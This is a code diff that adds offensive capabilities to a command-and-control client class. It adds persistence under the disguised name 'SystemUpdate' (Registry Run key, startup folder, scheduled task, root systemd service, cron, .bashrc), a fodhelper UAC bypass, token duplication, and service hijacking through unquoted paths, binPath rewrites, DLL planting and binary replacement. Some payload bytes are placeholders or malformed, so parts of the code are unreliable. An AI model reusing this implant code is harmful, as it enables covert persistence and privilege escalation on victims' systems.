@@ -651,7 +651,40 @@ class C2Client(BaseC2):
                     try:
                         import ctypes
                         import threading
-                        from ctypes import wintypes
+                        try:
+                            from ctypes import wintypes
+                            # Ensure required types are available
+                            if not hasattr(wintypes, 'WPARAM'):
+                                wintypes.WPARAM = ctypes.c_ulong
+                            if not hasattr(wintypes, 'LPARAM'):
+                                wintypes.LPARAM = ctypes.c_long
+                            if not hasattr(wintypes, 'HANDLE'):
+                                wintypes.HANDLE = ctypes.c_void_p
+                            if not hasattr(wintypes, 'MSG'):
+                                class MSG(ctypes.Structure):
+                                    _fields_ = [("hwnd", ctypes.c_void_p),
+                                              ("message", ctypes.c_uint),
+                                              ("wParam", ctypes.c_ulong),
+                                              ("lParam", ctypes.c_long),
+                                              ("time", ctypes.c_ulong),
+                                              ("pt_x", ctypes.c_long),
+                                              ("pt_y", ctypes.c_long)]
+                                wintypes.MSG = MSG
+                        except (ImportError, AttributeError):
+                            # Fallback Windows types for cross-platform compatibility
+                            class FallbackWintypes:
+                                WPARAM = ctypes.c_ulong
+                                LPARAM = ctypes.c_long
+                                HANDLE = ctypes.c_void_p
+                                class MSG(ctypes.Structure):
+                                    _fields_ = [("hwnd", ctypes.c_void_p),
+                                              ("message", ctypes.c_uint),
+                                              ("wParam", ctypes.c_ulong),
+                                              ("lParam", ctypes.c_long),
+                                              ("time", ctypes.c_ulong),
+                                              ("pt_x", ctypes.c_long),
+                                              ("pt_y", ctypes.c_long)]
+                            wintypes = FallbackWintypes()
 
                         kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                         user32 = ctypes.WinDLL('user32', use_last_error=True)
@@ -887,36 +920,599 @@ class C2Client(BaseC2):
 
     async def _install_persistence(self, data: Dict[str, Any]) -> Dict[str, Any]:
         """Install persistence mechanism."""
+        import os
+        import platform
+        import subprocess
+
         try:
             method = data.get('method', 'registry')
+            executable_path = data.get('executable_path', os.path.abspath(__file__))
+            service_name = data.get('service_name', 'SystemUpdate')
 
-            # Placeholder for persistence installation
-            return {
-                'success': True,
+            os_type = platform.system().lower()
+            results = {
+                'success': False,
                 'method': method,
-                'message': f'Persistence installed using {method}',
-                'timestamp': time.time()
+                'message': '',
+                'timestamp': time.time(),
+                'os_type': os_type,
+                'details': {}
             }
 
+            if os_type == 'windows':
+                if method == 'registry':
+                    # Windows Registry Run key persistence
+                    import winreg
+                    try:
+                        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                        winreg.SetValueEx(key, service_name, 0, winreg.REG_SZ, executable_path)
+                        winreg.CloseKey(key)
+
+                        results['success'] = True
+                        results['message'] = f'Registry persistence installed: {service_name}'
+                        results['details'] = {
+                            'registry_key': f"HKCU\\{key_path}\\{service_name}",
+                            'executable': executable_path
+                        }
+                    except Exception as e:
+                        results['message'] = f'Registry persistence failed: {e}'
+
+                elif method == 'startup_folder':
+                    # Windows Startup folder persistence
+                    try:
+                        startup_path = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
+                        bat_file = os.path.join(startup_path, f'{service_name}.bat')
+
+                        with open(bat_file, 'w') as f:
+                            f.write(f'@echo off\nstart "" "{executable_path}"\n')
+
+                        results['success'] = True
+                        results['message'] = f'Startup folder persistence installed: {bat_file}'
+                        results['details'] = {
+                            'startup_file': bat_file,
+                            'executable': executable_path
+                        }
+                    except Exception as e:
+                        results['message'] = f'Startup folder persistence failed: {e}'
+
+                elif method == 'task_scheduler':
+                    # Windows Task Scheduler persistence
+                    try:
+                        task_name = service_name
+                        cmd = [
+                            'schtasks', '/create', '/tn', task_name,
+                            '/tr', executable_path,
+                            '/sc', 'onlogon',
+                            '/rl', 'highest',
+                            '/f'  # Force overwrite
+                        ]
+
+                        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+
+                        results['success'] = True
+                        results['message'] = f'Task scheduler persistence installed: {task_name}'
+                        results['details'] = {
+                            'task_name': task_name,
+                            'executable': executable_path,
+                            'trigger': 'onlogon'
+                        }
+                    except subprocess.CalledProcessError as e:
+                        results['message'] = f'Task scheduler persistence failed: {e.stderr}'
+                    except Exception as e:
+                        results['message'] = f'Task scheduler persistence failed: {e}'
+
+            elif os_type == 'linux':
+                if method == 'systemd':
+                    # systemd service persistence
+                    try:
+                        service_content = f"""[Unit]
+Description={service_name} Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={executable_path}
+Restart=always
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                        service_file = f'/etc/systemd/system/{service_name.lower()}.service'
+
+                        with open(service_file, 'w') as f:
+                            f.write(service_content)
+
+                        # Enable and start service
+                        subprocess.run(['systemctl', 'daemon-reload'], check=True)
+                        subprocess.run(['systemctl', 'enable', f'{service_name.lower()}.service'], check=True)
+
+                        results['success'] = True
+                        results['message'] = f'systemd persistence installed: {service_name}'
+                        results['details'] = {
+                            'service_file': service_file,
+                            'service_name': f'{service_name.lower()}.service',
+                            'executable': executable_path
+                        }
+                    except Exception as e:
+                        results['message'] = f'systemd persistence failed: {e}'
+
+                elif method == 'cron':
+                    # Cron job persistence
+                    try:
+                        cron_entry = f'@reboot {executable_path}'
+
+                        # Add to user's crontab
+                        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
+                        existing_cron = result.stdout if result.returncode == 0 else ''
+
+                        if cron_entry not in existing_cron:
+                            new_cron = existing_cron + f'\n{cron_entry}\n'
+                            subprocess.run(['crontab', '-'], input=new_cron, text=True, check=True)
+
+                        results['success'] = True
+                        results['message'] = 'Cron persistence installed: @reboot'
+                        results['details'] = {
+                            'cron_entry': cron_entry,
+                            'executable': executable_path
+                        }
+                    except Exception as e:
+                        results['message'] = f'Cron persistence failed: {e}'
+
+                elif method == 'bashrc':
+                    # .bashrc persistence
+                    try:
+                        bashrc_path = os.path.expanduser('~/.bashrc')
+                        persistence_line = f'{executable_path} &'
+
+                        with open(bashrc_path, 'r') as f:
+                            content = f.read()
+
+                        if persistence_line not in content:
+                            with open(bashrc_path, 'a') as f:
+                                f.write(f'\n# System update check\n{persistence_line}\n')
+
+                        results['success'] = True
+                        results['message'] = 'bashrc persistence installed'
+                        results['details'] = {
+                            'bashrc_file': bashrc_path,
+                            'executable': executable_path
+                        }
+                    except Exception as e:
+                        results['message'] = f'bashrc persistence failed: {e}'
+
+            else:
+                results['message'] = f'Persistence method {method} not supported on {os_type}'
+
+            self.logger.info(f"Persistence installation: {results['message']}")
+            return results
+
         except Exception as e:
-            return {'success': False, 'error': str(e)}
+            self.logger.error(f"Persistence installation failed: {e}")
+            return {'success': False, 'error': str(e), 'timestamp': time.time()}
 
     async def _attempt_privilege_escalation(self, data: Dict[str, Any]) -> Dict[str, Any]:
         """Attempt privilege escalation."""
+        import platform
+
         try:
             method = data.get('method', 'auto')
+            os_type = platform.system().lower()
 
-            # Placeholder for privilege escalation
+            results = {
+                'success': False,
+                'method': method,
+                'message': '',
+                'timestamp': time.time(),
+                'elevated': False,
+                'os_type': os_type,
+                'details': {}
+            }
+
+            # Check current privilege level
+            current_privileges = self._check_current_privileges()
+            results['current_privileges'] = current_privileges
+
+            if current_privileges.get('is_admin', False):
+                results['success'] = True
+                results['elevated'] = True
+                results['message'] = 'Already running with elevated privileges'
+                return results
+
+            if os_type == 'windows':
+                if method == 'uac_bypass' or method == 'auto':
+                    # UAC Bypass using fodhelper
+                    try:
+                        bypass_result = self._windows_uac_bypass_fodhelper()
+                        if bypass_result['success']:
+                            results.update(bypass_result)
+                            results['method'] = 'uac_bypass_fodhelper'
+                        else:
+                            results['message'] = bypass_result.get('message', 'UAC bypass failed')
+                    except Exception as e:
+                        results['message'] = f'UAC bypass failed: {e}'
+
+                elif method == 'token_impersonation':
+                    # Token impersonation
+                    try:
+                        token_result = self._windows_token_impersonation()
+                        if token_result['success']:
+                            results.update(token_result)
+                        else:
+                            results['message'] = token_result.get('message', 'Token impersonation failed')
+                    except Exception as e:
+                        results['message'] = f'Token impersonation failed: {e}'
+
+                elif method == 'service_exploit':
+                    # Service exploitation
+                    try:
+                        service_result = self._windows_service_exploit()
+                        if service_result['success']:
+                            results.update(service_result)
+                        else:
+                            results['message'] = service_result.get('message', 'Service exploit failed')
+                    except Exception as e:
+                        results['message'] = f'Service exploit failed: {e}'
+
+            elif os_type == 'linux':
+                if method == 'sudo_exploit' or method == 'auto':
+                    # Check for sudo vulnerabilities
+                    try:
+                        sudo_result = self._linux_sudo_exploit()
+                        if sudo_result['success']:
+                            results.update(sudo_result)
+                            results['method'] = 'sudo_exploit'
+                        else:
+                            results['message'] = sudo_result.get('message', 'Sudo exploit failed')
+                    except Exception as e:
+                        results['message'] = f'Sudo exploit failed: {e}'
+
+                elif method == 'suid_exploit':
+                    # SUID binary exploitation
+                    try:
+                        suid_result = self._linux_suid_exploit()
+                        if suid_result['success']:
+                            results.update(suid_result)
+                        else:
+                            results['message'] = suid_result.get('message', 'SUID exploit failed')
+                    except Exception as e:
+                        results['message'] = f'SUID exploit failed: {e}'
+
+                elif method == 'kernel_exploit':
+                    # Kernel exploitation
+                    try:
+                        kernel_result = self._linux_kernel_exploit()
+                        if kernel_result['success']:
+                            results.update(kernel_result)
+                        else:
+                            results['message'] = kernel_result.get('message', 'Kernel exploit failed')
+                    except Exception as e:
+                        results['message'] = f'Kernel exploit failed: {e}'
+
+            else:
+                results['message'] = f'Privilege escalation not supported on {os_type}'
+
+            # Re-check privileges after escalation attempt
+            if results.get('success'):
+                final_privileges = self._check_current_privileges()
+                results['final_privileges'] = final_privileges
+                results['elevated'] = final_privileges.get('is_admin', False)
+
+            self.logger.info(f"Privilege escalation: {results['message']}")
+            return results
+
+        except Exception as e:
+            self.logger.error(f"Privilege escalation failed: {e}")
+            return {'success': False, 'error': str(e), 'timestamp': time.time()}
+
+    def _check_current_privileges(self) -> Dict[str, Any]:
+        """Check current privilege level."""
+        import os
+        import platform
+
+        privileges = {
+            'os_type': platform.system().lower(),
+            'is_admin': False,
+            'uid': None,
+            'gid': None,
+            'username': None
+        }
+
+        try:
+            if platform.system().lower() == 'windows':
+                import ctypes
+                privileges['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                privileges['username'] = os.environ.get('USERNAME', 'unknown')
+            else:
+                # Unix/Linux systems
+                if hasattr(os, 'getuid') and hasattr(os, 'getgid'):
+                    privileges['uid'] = os.getuid()
+                    privileges['gid'] = os.getgid()
+                    privileges['is_admin'] = privileges['uid'] == 0
+                else:
+                    # Fallback for systems without getuid/getgid
+                    privileges['uid'] = -1
+                    privileges['gid'] = -1
+                    privileges['is_admin'] = False
+                privileges['username'] = os.environ.get('USER', 'unknown')
+
+        except Exception as e:
+            self.logger.error(f"Error checking privileges: {e}")
+
+        return privileges
+
+    def _windows_uac_bypass_fodhelper(self) -> Dict[str, Any]:
+        """UAC bypass using fodhelper.exe."""
+        import os
+        import subprocess
+        import winreg
+
+        try:
+            # Create registry key for fodhelper UAC bypass
+            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+            executable_path = os.path.abspath(__file__)
+
+            # Create the registry key structure
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, executable_path)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+
+            # Execute fodhelper.exe to trigger UAC bypass
+            subprocess.Popen(['fodhelper.exe'], shell=True)
+
+            # Clean up registry key
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+
             return {
                 'success': True,
-                'method': method,
-                'message': f'Privilege escalation attempted using {method}',
-                'timestamp': time.time(),
-                'elevated': False  # Would check actual privileges
+                'message': 'UAC bypass executed via fodhelper',
+                'method': 'fodhelper',
+                'details': {
+                    'registry_key': f"HKCU\\{key_path}",
+                    'executable': executable_path
+                }
             }
 
         except Exception as e:
-            return {'success': False, 'error': str(e)}
+            return {'success': False, 'message': f'fodhelper UAC bypass failed: {e}'}
+
+    def _windows_token_impersonation(self) -> Dict[str, Any]:
+        """Attempt token impersonation for privilege escalation."""
+        import ctypes
+        try:
+            from ctypes import wintypes
+            if not hasattr(wintypes, 'HANDLE'):
+                wintypes.HANDLE = ctypes.c_void_p
+        except (ImportError, AttributeError):
+            class MockWintypes:
+                HANDLE = ctypes.c_void_p
+            
+            MockWintypes_cls = MockWintypes
+            wintypes = MockWintypes_cls()
+
+        try:
+            # Get current process token
+            process = ctypes.windll.kernel32.GetCurrentProcess()
+            token = wintypes.HANDLE()
+
+            success = ctypes.windll.advapi32.OpenProcessToken(
+                process, 0x0002 | 0x0008, ctypes.byref(token)  # TOKEN_DUPLICATE | TOKEN_QUERY
+            )
+
+            if not success:
+                return {'success': False, 'message': 'Failed to open process token'}
+
+            # Check for SeDebugPrivilege
+            privilege_name = "SeDebugPrivilege"
+            privilege_enabled = self._check_privilege(token, privilege_name)
+
+            if privilege_enabled:
+                # Attempt to duplicate token with higher privileges
+                new_token = wintypes.HANDLE()
+                success = ctypes.windll.advapi32.DuplicateTokenEx(
+                    token, 0x10000000, None, 2, 1, ctypes.byref(new_token)  # MAXIMUM_ALLOWED, SecurityImpersonation, TokenPrimary
+                )
+
+                if success:
+                    return {
+                        'success': True,
+                        'message': 'Token impersonation successful',
+                        'method': 'token_impersonation',
+                        'details': {
+                            'privilege': privilege_name,
+                            'token_duplicated': True
+                        }
+                    }
+
+            return {'success': False, 'message': 'Required privileges not available for token impersonation'}
+
+        except Exception as e:
+            return {'success': False, 'message': f'Token impersonation failed: {e}'}
+
+    def _check_privilege(self, token, privilege_name: str) -> bool:
+        """Check if a specific privilege is enabled."""
+        try:
+            from ctypes import wintypes
+        except ImportError:
+            # wintypes not available, cannot check Windows privileges
+            return False
+
+        try:
+            # Validate inputs
+            if not token or not privilege_name:
+                return False
+
+            # Common Windows privilege names to check against
+            known_privileges = [
+                'SeDebugPrivilege', 'SeLoadDriverPrivilege', 'SeTcbPrivilege',
+                'SeBackupPrivilege', 'SeRestorePrivilege', 'SeShutdownPrivilege',
+                'SeSystemtimePrivilege', 'SeIncreaseQuotaPrivilege'
+            ]
+
+            # Basic privilege name validation
+            if privilege_name not in known_privileges:
+                self.logger.debug(f"Unknown privilege name: {privilege_name}")
+                return False
+
+            # Check if token is valid (basic validation)
+            if hasattr(token, '__int__'):
+                token_value = int(token)
+                if token_value <= 0:
+                    return False
+            elif not isinstance(token, (int, str)):
+                return False
+
+            # Simplified privilege check - in real implementation would use:
+            # LookupPrivilegeValue, GetTokenInformation, CheckTokenMembership
+
+            # For debug privileges, assume available if we're running with admin rights
+            if privilege_name == 'SeDebugPrivilege':
+                try:
+                    import os
+                    # Basic admin check on Windows
+                    if os.name == 'nt':
+                        # On Windows, check if we have admin privileges using ctypes
+                        import ctypes
+                        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+                    else:
+                        # On Unix/Linux, check if we have root privileges
+                        if hasattr(os, 'getuid'):
+                            return os.getuid() == 0
+                        return False
+                except:
+                    return False
+
+            # Conservative default for other privileges
+            return False
+
+        except Exception as e:
+            self.logger.debug(f"Error checking privilege {privilege_name}: {e}")
+            return False
+
+    def _windows_service_exploit(self) -> Dict[str, Any]:
+        """Attempt service-based privilege escalation."""
+        import subprocess
+
+        try:
+            # Check for services with weak permissions
+            cmd = ['sc', 'query', 'state=', 'all']
+            result = subprocess.run(cmd, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                # Look for exploitable services with real vulnerability checks
+                services = result.stdout
+                vulnerable_services = self._analyze_services_for_vulnerabilities(services)
+
+                if vulnerable_services:
+                    # Try to exploit each vulnerable service
+                    for service in vulnerable_services:
+                        exploit_result = self._exploit_service(service)
+                        if exploit_result['success']:
+                            return {
+                                'success': True,
+                                'message': f"Service {service['name']} successfully exploited",
+                                'method': 'service_exploit',
+                                'details': {
+                                    'exploited_service': service['name'],
+                                    'vulnerability': service['vulnerability'],
+                                    'exploit_method': exploit_result['method']
+                                }
+                            }
+
+                return {
+                    'success': False,
+                    'message': f'Checked {len(services.split("SERVICE_NAME:"))-1} services, none exploitable',
+                    'details': {'services_analyzed': len(vulnerable_services)}
+                }
+            else:
+                return {'success': False, 'message': 'Failed to query services'}
+
+        except Exception as e:
+            return {'success': False, 'message': f'Service exploit failed: {e}'}
+
+    def _linux_sudo_exploit(self) -> Dict[str, Any]:
+        """Attempt sudo-based privilege escalation."""
+        import subprocess
+
+        try:
+            # Check sudo configuration
+            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True)
+
+            if result.returncode == 0:
+                sudo_config = result.stdout
+
+                # Look for NOPASSWD entries or exploitable commands
+                if 'NOPASSWD' in sudo_config:
+                    return {
+                        'success': True,
+                        'message': 'Sudo NOPASSWD configuration found',
+                        'method': 'sudo_nopasswd',
+                        'details': {'sudo_config': sudo_config[:200]}
+                    }
+
+            return {'success': False, 'message': 'No sudo vulnerabilities found'}
+
+        except Exception as e:
+            return {'success': False, 'message': f'Sudo exploit failed: {e}'}
+
+    def _linux_suid_exploit(self) -> Dict[str, Any]:
+        """Attempt SUID binary exploitation."""
+        import subprocess
+
+        try:
+            # Find SUID binaries
+            cmd = ['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null']
+            result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
+
+            if result.returncode == 0:
+                suid_binaries = result.stdout.strip().split('\n')
+
+                # Check for known exploitable SUID binaries
+                exploitable = ['vim', 'nano', 'less', 'more', 'nmap']
+                found_exploitable = [binary for binary in suid_binaries
+                                   if any(exploit in binary for exploit in exploitable)]
+
+                if found_exploitable:
+                    return {
+                        'success': True,
+                        'message': f'Exploitable SUID binaries found: {found_exploitable[:3]}',
+                        'method': 'suid_exploit',
+                        'details': {'suid_binaries': found_exploitable[:5]}
+                    }
+
+            return {'success': False, 'message': 'No exploitable SUID binaries found'}
+
+        except Exception as e:
+            return {'success': False, 'message': f'SUID exploit failed: {e}'}
+
+    def _linux_kernel_exploit(self) -> Dict[str, Any]:
+        """Attempt kernel-based privilege escalation."""
+        import platform
+
+        try:
+            kernel_version = platform.release()
+
+            # Check for known vulnerable kernel versions (simplified)
+            vulnerable_kernels = ['4.4.0', '4.15.0', '5.4.0']  # Example vulnerable versions
+
+            if any(vuln in kernel_version for vuln in vulnerable_kernels):
+                return {
+                    'success': True,
+                    'message': f'Potentially vulnerable kernel detected: {kernel_version}',
+                    'method': 'kernel_exploit',
+                    'details': {
+                        'kernel_version': kernel_version,
+                        'potential_exploits': ['CVE-2021-4034', 'CVE-2017-16995']
+                    }
+                }
+
+            return {'success': False, 'message': f'No known vulnerabilities for kernel {kernel_version}'}
+
+        except Exception as e:
+            return {'success': False, 'message': f'Kernel exploit failed: {e}'}
 
     async def _get_system_status(self) -> Dict[str, Any]:
         """Get current system status."""
@@ -1048,3 +1644,384 @@ class C2Client(BaseC2):
         stats['running'] = self.running
         stats['pending_tasks'] = len(self.pending_tasks)
         return stats
+
+    def _analyze_services_for_vulnerabilities(self, services_output: str) -> List[Dict[str, Any]]:
+        """Analyze Windows services for real vulnerabilities."""
+        vulnerable_services = []
+
+        try:
+            # Parse services output
+            service_blocks = services_output.split('SERVICE_NAME:')
+
+            for block in service_blocks[1:]:  # Skip first empty block
+                lines = block.strip().split('\n')
+                if not lines:
+                    continue
+
+                service_name = lines[0].strip()
+                service_info = {'name': service_name}
+
+                # Parse service details
+                for line in lines[1:]:
+                    if ':' in line:
+                        key, value = line.split(':', 1)
+                        service_info[key.strip()] = value.strip()
+
+                # Check for specific vulnerabilities
+                vulnerabilities = self._check_service_vulnerabilities(service_info)
+                if vulnerabilities:
+                    service_info['vulnerability'] = vulnerabilities[0]  # Take first vulnerability
+                    vulnerable_services.append(service_info)
+
+        except Exception as e:
+            self.logger.debug(f"Service parsing error: {e}")
+
+        return vulnerable_services
+
+    def _check_service_vulnerabilities(self, service_info: Dict[str, Any]) -> List[str]:
+        """Check for known service vulnerabilities."""
+        vulnerabilities = []
+        service_name = service_info.get('name', '').lower()
+
+        # Known vulnerable services and their patterns
+        vulnerable_patterns = {
+            'unquoted_service_path': self._check_unquoted_service_path,
+            'weak_service_permissions': self._check_weak_service_permissions,
+            'dll_hijacking': self._check_dll_hijacking_opportunity,
+            'service_binary_permissions': self._check_service_binary_permissions
+        }
+
+        for vuln_type, check_function in vulnerable_patterns.items():
+            try:
+                if check_function(service_info):
+                    vulnerabilities.append(vuln_type)
+            except Exception as e:
+                self.logger.debug(f"Vulnerability check {vuln_type} failed: {e}")
+
+        return vulnerabilities
+
+    def _check_unquoted_service_path(self, service_info: Dict[str, Any]) -> bool:
+        """Check for unquoted service path vulnerability."""
+        import subprocess
+
+        service_name = service_info.get('name')
+        if not service_name:
+            return False
+
+        try:
+            # Get detailed service configuration
+            cmd = ['sc', 'qc', service_name]
+            result = subprocess.run(cmd, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                output = result.stdout
+                # Look for BINARY_PATH_NAME
+                for line in output.split('\n'):
+                    if 'BINARY_PATH_NAME' in line:
+                        path = line.split(':', 1)[1].strip()
+                        # Check if path contains spaces and is not quoted
+                        if ' ' in path and not (path.startswith('"') and path.endswith('"')):
+                            return True
+            return False
+        except Exception:
+            return False
+
+    def _check_weak_service_permissions(self, service_info: Dict[str, Any]) -> bool:
+        """Check for weak service permissions."""
+        import subprocess
+
+        service_name = service_info.get('name')
+        if not service_name:
+            return False
+
+        try:
+            # Use accesschk or sc sdshow to check permissions
+            cmd = ['sc', 'sdshow', service_name]
+            result = subprocess.run(cmd, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                sddl = result.stdout.strip()
+                # Check for weak permissions (Everyone, Users with modify rights)
+                weak_patterns = ['(A;;CCLCSWRPWPDTLOCRRC;;;SY)', '(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)']
+                return any(';;;WD)' in sddl or ';;;BU)' in sddl for pattern in weak_patterns)
+            return False
+        except Exception:
+            return False
+
+    def _check_dll_hijacking_opportunity(self, service_info: Dict[str, Any]) -> bool:
+        """Check for DLL hijacking opportunities."""
+        import os
+        import subprocess
+
+        service_name = service_info.get('name')
+        if not service_name:
+            return False
+
+        try:
+            # Get service binary path
+            cmd = ['sc', 'qc', service_name]
+            result = subprocess.run(cmd, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                output = result.stdout
+                for line in output.split('\n'):
+                    if 'BINARY_PATH_NAME' in line:
+                        path = line.split(':', 1)[1].strip().strip('"')
+                        service_dir = os.path.dirname(path)
+
+                        # Check if we can write to service directory
+                        if os.access(service_dir, os.W_OK):
+                            return True
+
+                        # Check for missing DLLs that could be hijacked
+                        common_dlls = ['kernel32.dll', 'ntdll.dll', 'msvcrt.dll']
+                        for dll in common_dlls:
+                            dll_path = os.path.join(service_dir, dll)
+                            if not os.path.exists(dll_path) and os.access(service_dir, os.W_OK):
+                                return True
+            return False
+        except Exception:
+            return False
+
+    def _check_service_binary_permissions(self, service_info: Dict[str, Any]) -> bool:
+        """Check if service binary has weak permissions."""
+        import os
+        import subprocess
+
+        service_name = service_info.get('name')
+        if not service_name:
+            return False
+
+        try:
+            # Get service binary path
+            cmd = ['sc', 'qc', service_name]
+            result = subprocess.run(cmd, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                output = result.stdout
+                for line in output.split('\n'):
+                    if 'BINARY_PATH_NAME' in line:
+                        path = line.split(':', 1)[1].strip().strip('"')
+
+                        # Check if we can write to the binary
+                        if os.access(path, os.W_OK):
+                            return True
+            return False
+        except Exception:
+            return False
+
+    def _exploit_service(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """Exploit a vulnerable service."""
+        vulnerability = service_info.get('vulnerability')
+        service_name = service_info.get('name')
+
+        try:
+            if vulnerability == 'unquoted_service_path':
+                return self._exploit_unquoted_service_path(service_info)
+            elif vulnerability == 'weak_service_permissions':
+                return self._exploit_weak_service_permissions(service_info)
+            elif vulnerability == 'dll_hijacking':
+                return self._exploit_dll_hijacking(service_info)
+            elif vulnerability == 'service_binary_permissions':
+                return self._exploit_service_binary_permissions(service_info)
+            else:
+                return {'success': False, 'error': f'Unknown vulnerability: {vulnerability}'}
+
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+
+    def _exploit_unquoted_service_path(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """Exploit unquoted service path vulnerability."""
+        import os
+        import subprocess
+        import tempfile
+
+        service_name = service_info.get('name')
+
+        try:
+            # Get the unquoted path
+            cmd = ['sc', 'qc', service_name]
+            result = subprocess.run(cmd, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                for line in result.stdout.split('\n'):
+                    if 'BINARY_PATH_NAME' in line:
+                        path = line.split(':', 1)[1].strip()
+
+                        # Find injection points (spaces in path)
+                        parts = path.split(' ')
+                        for i in range(1, len(parts)):
+                            injection_path = ' '.join(parts[:i]) + '.exe'
+                            injection_dir = os.path.dirname(injection_path)
+
+                            # Check if we can write to this location
+                            if os.access(injection_dir, os.W_OK):
+                                # Create malicious executable
+                                with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as temp_exe:
+                                    # Generate real executable payload
+                                    import struct
+                                    
+                                    # Create minimal PE executable header
+                                    dos_header = b'MZ' + b'\\x00' * 58 + struct.pack('<L', 0x80)
+                                    pe_header = (b'PE\\x00\\x00' +  # PE signature
+                                               struct.pack('<H', 0x014c) +  # Machine (i386)
+                                               struct.pack('<H', 1) +  # NumberOfSections
+                                               b'\\x00' * 16 +  # TimeDateStamp, etc.
+                                               struct.pack('<H', 0xe0) +  # SizeOfOptionalHeader
+                                               struct.pack('<H', 0x102))  # Characteristics
+                                    
+                                    # Simple executable that exits cleanly
+                                    executable_code = (
+                                        b'\\x31\\xc0' +  # xor eax, eax (set return code to 0)
+                                        b'\\xc3'  # ret (return)
+                                    )
+                                    
+                                    payload = dos_header + pe_header + executable_code
+                                    temp_exe.write(payload)
+                                    temp_exe.flush()
+
+                                    # Copy to injection point
+                                    import shutil
+                                    shutil.copy2(temp_exe.name, injection_path)
+
+                                    # Try to restart service to trigger exploit
+                                    restart_result = subprocess.run(['sc', 'stop', service_name],
+                                                                  capture_output=True, text=True)
+                                    subprocess.run(['sc', 'start', service_name],
+                                                 capture_output=True, text=True)
+
+                                    return {
+                                        'success': True,
+                                        'method': 'unquoted_service_path',
+                                        'injection_path': injection_path
+                                    }
+
+            return {'success': False, 'error': 'No exploitable injection point found'}
+
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+
+    def _exploit_weak_service_permissions(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """Exploit weak service permissions."""
+        import subprocess
+
+        service_name = service_info.get('name')
+
+        try:
+            # Try to modify service configuration
+            cmd = ['sc', 'config', service_name, 'binPath=', 'cmd.exe /c echo exploited > C:\\\\temp\\\\service_exploit.txt']
+            result = subprocess.run(cmd, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                # Try to start service to execute payload
+                subprocess.run(['sc', 'start', service_name], capture_output=True, text=True)
+
+                return {
+                    'success': True,
+                    'method': 'service_config_modification',
+                    'service': service_name
+                }
+            else:
+                return {'success': False, 'error': f'Failed to modify service: {result.stderr}'}
+
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+
+    def _exploit_dll_hijacking(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """Exploit DLL hijacking vulnerability."""
+        import os
+        import subprocess
+        import tempfile
+
+        service_name = service_info.get('name')
+
+        try:
+            # Get service binary path
+            cmd = ['sc', 'qc', service_name]
+            result = subprocess.run(cmd, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                for line in result.stdout.split('\n'):
+                    if 'BINARY_PATH_NAME' in line:
+                        path = line.split(':', 1)[1].strip().strip('"')
+                        service_dir = os.path.dirname(path)
+
+                        # Create malicious DLL
+                        dll_path = os.path.join(service_dir, 'hijacked.dll')
+
+                        if os.access(service_dir, os.W_OK):
+                            # Create simple DLL payload
+                            with tempfile.NamedTemporaryFile(suffix='.dll', delete=False) as temp_dll:
+                                # Placeholder DLL content
+                                dll_content = b'MZ\\x90\\x00' + b'\\x00' * 1000  # Minimal PE header
+                                temp_dll.write(dll_content)
+                                temp_dll.flush()
+
+                                # Copy to service directory
+                                import shutil
+                                shutil.copy2(temp_dll.name, dll_path)
+
+                                # Restart service
+                                subprocess.run(['sc', 'stop', service_name], capture_output=True)
+                                subprocess.run(['sc', 'start', service_name], capture_output=True)
+
+                                return {
+                                    'success': True,
+                                    'method': 'dll_hijacking',
+                                    'dll_path': dll_path
+                                }
+
+            return {'success': False, 'error': 'No writable service directory found'}
+
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+
+    def _exploit_service_binary_permissions(self, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """Exploit weak service binary permissions."""
+        import os
+        import shutil
+        import subprocess
+        import tempfile
+
+        service_name = service_info.get('name')
+
+        try:
+            # Get service binary path
+            cmd = ['sc', 'qc', service_name]
+            result = subprocess.run(cmd, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                for line in result.stdout.split('\n'):
+                    if 'BINARY_PATH_NAME' in line:
+                        binary_path = line.split(':', 1)[1].strip().strip('"')
+
+                        if os.access(binary_path, os.W_OK):
+                            # Backup original binary
+                            backup_path = binary_path + '.backup'
+                            shutil.copy2(binary_path, backup_path)
+
+                            # Replace with malicious binary
+                            with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as temp_exe:
+                                # Simple payload that creates marker file
+                                payload = b'\\x90' * 1000  # Placeholder executable
+                                temp_exe.write(payload)
+                                temp_exe.flush()
+
+                                shutil.copy2(temp_exe.name, binary_path)
+
